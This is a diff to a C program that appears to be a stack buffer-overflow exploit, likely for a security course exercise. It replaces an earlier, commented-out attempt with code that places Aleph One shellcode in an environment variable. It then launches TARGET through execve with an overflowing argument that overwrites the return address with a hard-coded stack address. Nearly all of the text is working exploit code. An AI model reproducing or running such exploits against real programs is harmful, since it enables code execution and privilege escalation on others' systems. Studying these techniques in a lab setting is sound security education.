@@ -12,25 +12,38 @@ int main(void)
   char *args[3]; 
   char *env[1];
 
-  char str[20];
-  memset(str, 0, 20);
+  // char str[20];
+  // memset(str, 0, 20);
 
-  for (int i = 0; i < 16; i++)
-  {
-  	strcat(str, "A");
-  }
-  // Segfault:
-  // strcat(str, "\x97\xff\xff\xbf");
-  // env: 0xbfffff97:	0xdb31c031
+  // for (int i = 0; i < 16; i++)
+  // {
+  // 	strcat(str, "A");
+  // }
+  // // Segfault:
+  // // strcat(str, "\x97\xff\xff\xbf");
+  // // env: 0xbfffff97:	0xdb31c031
 
-  strcat(str, "\xe9\xff\xff\xbf");
+  // strcat(str, "\xe9\xff\xff\xbf");
+
+  // args[0] = TARGET;
+  // // max input size is 4 * 5 = 20
+  // args[1] = str;
+  // args[2] = NULL;
+  
+  // env[0] = shellcode;
+
+  char *preface = "shellcode=";
+  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+16);
+  strcat(envvar, preface);
+  strcat(envvar, "AAAA");
+  strcat(envvar, "\x97\xff\xff\xbf");
+  strcat(envvar, shellcodeAlephOne);
 
   args[0] = TARGET;
-  // max input size is 4 * 5 = 20
-  args[1] = str;
+  args[1] = "AAAAAAAAAAAAAAAA\x8f\xff\xff\xbf";
   args[2] = NULL;
   
-  env[0] = shellcode;
+  env[0] = envvar;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
